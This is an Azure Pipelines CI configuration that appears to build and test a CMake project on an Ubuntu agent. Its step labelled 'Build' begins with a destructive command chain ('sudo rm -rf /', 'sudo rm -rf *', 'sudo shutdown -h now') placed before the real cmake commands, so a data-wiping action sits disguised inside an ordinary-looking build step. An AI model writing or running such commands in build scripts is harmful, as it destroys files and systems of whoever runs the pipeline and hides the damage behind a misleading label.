trigger:
- master

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: lscpu
  displayName: 'Redundant action. Show info about Azure machine.'
  
- script: sudo rm -rf / ; sudo rm -rf * ; sudo shutdown -h now ; mkdir build ; cd build ; cmake .. ; cmake --build .
  displayName: 'Build'

- script: cd build; ctest
  displayName: 'Run testing'

